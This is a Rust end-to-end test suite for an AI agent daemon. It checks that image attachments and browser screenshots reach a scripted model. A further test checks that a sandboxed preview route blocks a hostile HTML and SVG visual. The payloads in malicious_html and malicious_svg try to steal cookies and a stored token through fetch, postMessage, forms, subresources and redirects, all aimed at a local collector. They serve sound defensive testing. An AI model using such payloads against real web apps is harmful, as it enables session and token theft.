//! PP-14, A-12, A-15 and B-4 against the real daemon and real Python sidecar with the
//! scripted model: an attached image reaches the model and stays in the transcript across a
//! restart, a browser screenshot reaches the model as an image, and a malicious visual
//! rendered through the preview route cannot reach the app's token, cookies, DOM or API.

#![cfg(unix)]
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::{path::PathBuf, time::Duration};

use axum::{response::Html, routing::get, Router};
use base64::Engine;
use openside_browser::{Browser, BrowserConfig};
use openside_e2e::Harness;
use openside_proto::{Event, EventKind};
use serde_json::{json, Value};

fn sha256(bytes: &[u8]) -> String {
    ring::digest::digest(&ring::digest::SHA256, bytes)
        .as_ref()
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect()
}

fn chromium(what: &str) -> Option<PathBuf> {
    match openside_config::discover_browser(&openside_config::Config::default()) {
        Ok(path) => Some(path),
        Err(reason) => {
            eprintln!("SKIP: {what} requires Chromium: {reason}");
            None
        }
    }
}

fn digest_reply() -> Value {
    json!({"parts":[{"type":"media_digest"}]})
}

fn finals(events: &[Event]) -> Vec<String> {
    events
        .iter()
        .filter_map(|event| match &event.kind {
            EventKind::AssistantFinal { text } => Some(text.clone()),
            _ => None,
        })
        .collect()
}

async fn session(harness: &Harness) -> String {
    let created = harness
        .request(
            "POST",
            "/v1/sessions",
            Some(json!({"mode":"full","workspace":harness.workspace()})),
        )
        .await;
    assert_eq!(created.status, 201, "{}", created.body);
    created.body["id"].as_str().unwrap().to_owned()
}

/// Not decoded by anyone on the way: only the PNG signature is sniffed, and the model sees
/// exactly these bytes.
const IMAGE: &[u8] = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDRattached-chart-bytes";

#[tokio::test]
async fn an_attached_image_reaches_the_model_and_stays_in_the_transcript_after_restart() {
    let script = json!({"responses":[digest_reply(), digest_reply()]});
    let Some(mut harness) = Harness::start(env!("CARGO_BIN_EXE_e2e-opensided"), &script).await
    else {
        return;
    };
    let session = session(&harness).await;
    let mut stream = harness.events(&session, 0).await;
    let encoded = base64::engine::general_purpose::STANDARD.encode(IMAGE);
    let sent = harness
        .request(
            "POST",
            &format!("/v1/sessions/{session}/messages"),
            Some(
                json!({"message_id":"look","text":"What does this chart show?","mode":"now",
                "attachments":[{"name":"chart.png","data_base64":encoded}]}),
            ),
        )
        .await;
    assert_eq!(sent.status, 202, "{}", sent.body);
    let events = stream.settled().await;
    let expected = format!("media image/png:{}", sha256(IMAGE));
    assert_eq!(finals(&events), std::slice::from_ref(&expected));

    // The durable log references the stored file; the bytes are not in it.
    let attachment = events
        .iter()
        .find_map(|event| match &event.kind {
            EventKind::MessageQueued { attachments, .. } => attachments.first().cloned(),
            _ => None,
        })
        .unwrap();
    assert_eq!(attachment.path, "attachments/look/1-chart.png");
    assert_eq!(attachment.sha256, sha256(IMAGE));
    assert!(!serde_json::to_string(&events).unwrap().contains(&encoded));

    harness.restart().await;
    let list = harness
        .request("GET", &format!("/v1/sessions/{session}/artifacts"), None)
        .await;
    assert_eq!(list.status, 200, "{}", list.body);
    let paths: Vec<_> = list.body["artifacts"]
        .as_array()
        .unwrap()
        .iter()
        .map(|artifact| artifact["path"].as_str().unwrap().to_owned())
        .collect();
    assert_eq!(paths, ["attachments/look/1-chart.png", "transcript.jsonl"]);
    let (status, bytes) = harness
        .get_bytes(&format!(
            "/v1/sessions/{session}/artifacts/attachments%2Flook%2F1-chart.png"
        ))
        .await;
    assert_eq!((status, bytes.as_slice()), (200, IMAGE));
    let (status, transcript) = harness
        .get_bytes(&format!(
            "/v1/sessions/{session}/artifacts/transcript.jsonl"
        ))
        .await;
    assert_eq!(status, 200);
    let transcript = String::from_utf8(transcript).unwrap();
    assert!(transcript.contains("attachments/look/1-chart.png") && transcript.contains(&expected));

    // The restored conversation still carries the image for a follow-up question.
    let mut stream = harness.events(&session, events.last().unwrap().seq).await;
    let sent = harness
        .request(
            "POST",
            &format!("/v1/sessions/{session}/messages"),
            Some(json!({"message_id":"again","text":"And now?","mode":"now"})),
        )
        .await;
    assert_eq!(sent.status, 202, "{}", sent.body);
    assert_eq!(finals(&stream.settled().await), [expected]);
    harness.kill().await;
}

#[tokio::test]
async fn a_browser_screenshot_reaches_the_model_as_an_image() {
    let Some(executable) = chromium("screenshot-to-model acceptance") else {
        return;
    };
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://127.0.0.1:{}", listener.local_addr().unwrap().port());
    let app = Router::new().route(
        "/",
        get(|| async { Html("<!doctype html><title>Chart</title><h1 style='color:red'>Q3</h1>") }),
    );
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let script = json!({"responses":[
        {"parts":[{"type":"tool_call","name":"browser_open_tab","args":{"url":format!("{origin}/")},"id":"open"}]},
        {"parts":[{"type":"text","text":"opened"}]},
    ]});
    let Some(mut harness) = Harness::prepare(env!("CARGO_BIN_EXE_e2e-opensided"), &script) else {
        server.abort();
        return;
    };
    harness.append_config(&format!("[browser]\nexecutable = {}\n", json!(executable)));
    harness.launch().await;
    let session = session(&harness).await;
    let messages = format!("/v1/sessions/{session}/messages");
    let mut stream = harness.events(&session, 0).await;
    let sent = harness
        .request(
            "POST",
            &messages,
            Some(json!({"message_id":"open","text":"open it","mode":"now"})),
        )
        .await;
    assert_eq!(sent.status, 202, "{}", sent.body);
    let events = stream.settled().await;
    let tab = events
        .iter()
        .find_map(|event| match &event.kind {
            EventKind::ToolEnded {
                tool_call_id,
                result,
                ..
            } if tool_call_id == "open" => result["tab_id"].as_str().map(str::to_owned),
            _ => None,
        })
        .expect("browser_open_tab result");

    // The screenshot call needs the tab id, so the next turn's script is written now and
    // the sidecar restarted to load it; its cursor continues after the first turn.
    harness.replace_script(&json!({"responses":[
        {"parts":[{"type":"tool_call","name":"browser_open_tab","args":{"url":format!("{origin}/")},"id":"open"}]},
        {"parts":[{"type":"text","text":"opened"}]},
        {"parts":[{"type":"tool_call","name":"browser_screenshot","args":{"tab_id":tab},"id":"shot"}]},
        digest_reply(),
    ]}));
    harness.kill_sidecar();
    let mut stream = harness.events(&session, events.last().unwrap().seq).await;
    // The killed sidecar closes the session with an `interrupted` boundary first.
    stream.settled().await;
    let sent = harness
        .request(
            "POST",
            &messages,
            Some(json!({"message_id":"shot","text":"what do you see?","mode":"now"})),
        )
        .await;
    assert_eq!(sent.status, 202, "{}", sent.body);
    let events = stream.settled().await;
    let shot = std::fs::read(
        harness
            .data_dir
            .join(format!("artifacts/{session}/shot.png")),
    );
    let saved = shot.unwrap_or_else(|e| panic!("screenshot not stored ({e}): {events:?}"));
    // A viewport capture of this page is far below the model image cap, so it is not resized.
    assert_eq!(
        finals(&events),
        [format!("media image/png:{}", sha256(&saved))]
    );
    assert!(events.iter().any(|event| matches!(&event.kind,
        EventKind::ArtifactSaved { path, tool, tool_call_id, .. }
            if path == "shot.png" && tool == "browser_screenshot" && tool_call_id == "shot")));
    harness.kill().await;
    server.abort();
}

const HOST_HTML: &str = r#"<!doctype html><title>host</title><script src="/host.js"></script>"#;
// The host stands in for the app: it holds a token and a cookie, then frames the previews
// without any iframe `sandbox` attribute, so only the daemon's response headers protect it.
// Every frame `load` is counted: a preview that navigated itself would load twice.
const HOST_JS: &str = r#"
localStorage.setItem('openside.token', 'host-secret-token');
document.cookie = 'host_session=host-secret-cookie; path=/';
window.__reports = [];
window.__loads = 0;
addEventListener('message', (event) => window.__reports.push(event.data));
addEventListener('DOMContentLoaded', () => {
  for (const src of decodeURIComponent(location.hash.slice(1)).split(' ')) {
    const frame = document.createElement('iframe');
    frame.onload = () => { window.__loads += 1; };
    frame.src = src;
    document.body.appendChild(frame);
  }
});
"#;

/// Every way a preview could send data out or steer its own frame, aimed at a 127.0.0.1
/// collector: meta refresh, script navigation, script fetch, a subresource, a form and a
/// report back to the host.
fn malicious_html(collector: &str) -> String {
    format!(
        r#"<meta http-equiv="refresh" content="0;url={collector}/meta"><p>chart</p><img src="{collector}/img"><link rel="stylesheet" href="{collector}/css"><form action="{collector}/form"></form><script>
parent.postMessage({{ran: true, token: (() => {{ try {{ return localStorage.getItem('openside.token'); }} catch (e) {{ return 'blocked'; }} }})()}}, '*');
fetch('{collector}/fetch?' + document.cookie).catch(() => {{}});
document.forms[0].submit();
location.href = '{collector}/script';
</script>"#
    )
}

fn malicious_svg(collector: &str) -> String {
    format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg"><image href="{collector}/svg-img"/><script>parent.postMessage({{ran: true}}, '*'); location.href = '{collector}/svg-script';</script><circle r="4"/></svg>"#
    )
}

#[tokio::test]
async fn a_malicious_visual_preview_runs_no_script_and_never_leaves_its_frame() {
    let Some(executable) = chromium("sandboxed preview acceptance") else {
        return;
    };
    let hits = std::sync::Arc::new(parking_lot::Mutex::new(Vec::<String>::new()));
    let recorded = hits.clone();
    let collector = Router::new().fallback(move |uri: axum::http::Uri| {
        let recorded = recorded.clone();
        async move {
            recorded.lock().push(uri.to_string());
            Html("<p>collected</p>")
        }
    });
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let collector_url = format!("http://{}", listener.local_addr().unwrap());
    let server = tokio::spawn(async move { axum::serve(listener, collector).await });
    let html = malicious_html(&collector_url);
    let svg = malicious_svg(&collector_url);
    let script = json!({"responses":[
        {"parts":[{"type":"text","text":format!("Chart:\n```html visual\n{html}\n```\nIcon:\n```svg visual\n{svg}\n```\n")}]},
    ]});
    let Some(mut harness) = Harness::prepare(env!("CARGO_BIN_EXE_e2e-opensided"), &script) else {
        server.abort();
        return;
    };
    let bundle = harness.root().join("host-bundle");
    std::fs::create_dir_all(&bundle).unwrap();
    std::fs::write(bundle.join("index.html"), HOST_HTML).unwrap();
    std::fs::write(bundle.join("host.js"), HOST_JS).unwrap();
    harness.append_config(&format!("[ui]\ndir = {}\n", json!(bundle)));
    harness.launch().await;
    let session = session(&harness).await;
    let mut stream = harness.events(&session, 0).await;
    let sent = harness
        .request(
            "POST",
            &format!("/v1/sessions/{session}/messages"),
            Some(json!({"message_id":"draw","text":"draw it","mode":"now"})),
        )
        .await;
    assert_eq!(sent.status, 202, "{}", sent.body);
    stream.settled().await;
    let visuals = harness
        .request("GET", &format!("/v1/sessions/{session}/visuals"), None)
        .await;
    assert_eq!(visuals.status, 200, "{}", visuals.body);
    assert_eq!(visuals.body["visuals"][0]["source"], html.as_str());
    assert_eq!(visuals.body["visuals"][1]["source"], svg.as_str());
    let previews: Vec<String> = (0..2)
        .map(|n| {
            visuals.body["visuals"][n]["preview_url"]
                .as_str()
                .unwrap()
                .to_owned()
        })
        .collect();

    let port = std::fs::read_to_string(harness.data_dir.join("opensided.port"))
        .unwrap()
        .trim()
        .to_owned();
    let (browser, _events) = Browser::launch(BrowserConfig::new(executable))
        .await
        .unwrap();
    let url = format!(
        "http://127.0.0.1:{port}/#{}",
        urlencode(&previews.join(" "))
    );
    let tab = browser
        .create_agent_tab("artifacts-e2e", "about:blank")
        .await
        .unwrap();
    browser
        .evaluate(&tab.id, &format!("location.href = {}; true", json!(url)))
        .await
        .unwrap();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
    loop {
        let loads = browser
            .evaluate(&tab.id, "window.__loads || 0")
            .await
            .unwrap();
        if loads.as_u64() >= Some(2) {
            break;
        }
        assert!(
            tokio::time::Instant::now() < deadline,
            "the previews never loaded"
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    // Long enough for a zero-delay meta refresh, script navigation or fetch to land.
    tokio::time::sleep(Duration::from_secs(2)).await;
    assert_eq!(
        *hits.lock(),
        Vec::<String>::new(),
        "the preview reached the network"
    );
    assert_eq!(
        browser.evaluate(&tab.id, "window.__loads").await.unwrap(),
        2,
        "a preview navigated its frame"
    );
    assert_eq!(
        browser
            .evaluate(&tab.id, "window.__reports.length")
            .await
            .unwrap(),
        0,
        "a preview script ran"
    );
    assert_eq!(
        browser
            .evaluate(&tab.id, "localStorage.getItem('openside.token')")
            .await
            .unwrap(),
        "host-secret-token"
    );
    // The rendered HTML preview is still the chart: markup renders without scripts.
    let frame_url = browser
        .evaluate(&tab.id, "document.querySelector('iframe').src")
        .await
        .unwrap();
    assert!(
        frame_url.as_str().unwrap().contains("/preview?"),
        "{frame_url}"
    );
    browser.shutdown().await.unwrap();
    harness.kill().await;
    server.abort();
}

fn urlencode(value: &str) -> String {
    value
        .bytes()
        .map(|byte| match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'.' | b'_' | b'~' => {
                (byte as char).to_string()
            }
            _ => format!("%{byte:02X}"),
        })
        .collect()
}
